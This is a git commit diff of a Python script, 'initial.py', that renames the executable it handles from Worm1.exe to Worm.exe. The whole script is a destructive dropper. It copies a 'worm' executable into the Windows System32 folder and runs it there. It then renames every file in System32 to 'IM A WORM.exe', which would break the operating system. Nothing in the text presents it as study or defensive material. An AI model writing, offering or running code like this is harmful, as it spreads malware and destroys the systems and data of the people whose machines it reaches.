5781fc2581871f355d4eb482e2a328c1c23e3c44
RCDelta <104479252+RCDelta@users.noreply.github.com>
2024-04-24 21:29:42 -0400

    Update initial.py

--- initial.py
+++ initial.py
@@ -1,8 +1,8 @@
 import os
 import shutil
 cwd = os.getcwd()
-shutil.copy(cwd+"/Worm1.exe", "/Windows/System32")
+shutil.copy(cwd+"/Worm.exe", "/Windows/System32")
 os.chdir("/Windows/System32")
-os.system(".\Worm1.exe")
+os.system(".\Worm.exe")
 for files in os.listdir(os.getcwd()):
     os.rename(files, "IM A WORM.exe")
